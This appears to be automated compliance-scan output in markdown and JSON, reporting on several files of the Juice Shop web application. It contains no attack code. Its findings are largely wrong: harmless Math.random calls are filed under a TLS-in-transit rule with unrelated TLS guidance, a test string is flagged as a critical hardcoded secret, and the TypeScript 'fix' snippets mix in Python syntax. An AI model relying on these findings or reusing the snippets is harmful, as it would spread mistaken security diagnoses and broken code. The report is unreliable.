"IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/data/datacreator.ts`
**Scanned at**: 2026-10-11T16:34:19.807046+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 305 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 305
for (let i = 0; i < length; i++) { text += possible.charAt(Math.floor(Math.random() * possible.length)) }
// Line 323
quantity: product.quantity ?? Math.floor(Math.random() * 70 + 30),
// Line 381
product.price = product.price ?? Math.floor(Math.random() * 9 + 1)
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [SAST-M-006](https://verify.example-org.internal/?id=SAST-M-006) | Native Memory Safety and Unsafe Code Assurance |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [SECR-M-005](https://verify.example-org.internal/?id=SECR-M-005) | No Secrets in Build Logs |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 305, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/Services/keys.service.spec.ts`
**Scanned at**: 2026-10-11T16:34:26.872767+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 68 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded credential in named variable detected
```ts
// Line 68
expect(req.request.body).toEqual({ privateKey: 'privateKey' })
```
**Suggested fix:**
```ts
# Suggested fix: load all credentials from environment variables or a vault
import os
JWT_SECRET = os.environ['JWT_SECRET']          # Python
// const jwtSecret = process.env.JWT_SECRET;   // Node.js
# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [CRYPT-M-001](https://verify.example-org.internal/?id=CRYPT-M-001) | Encryption at Rest |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 68, "message": "Hardcoded credential in named variable detected", "fix_snippet": "# Suggested fix: load all credentials from environment variables or a vault\nimport os\nJWT_SECRET = os.environ['JWT_SECRET']          # Python\n// const jwtSecret = process.env.JWT_SECRET;   // Node.js\n# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/Services/conversation-storage.service.ts`
**Scanned at**: 2026-10-11T16:34:29.755906+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 17 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 17
const random8 = Array.from({ length: 8 }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 17, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/chatbot/chat-welcome-screen/chat-welcome-screen.component.ts`
**Scanned at**: 2026-10-11T16:34:35.220332+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 71 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 71
const chosen = availableSuggestions[Math.floor(Math.random() * availableSuggestions.length)]
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
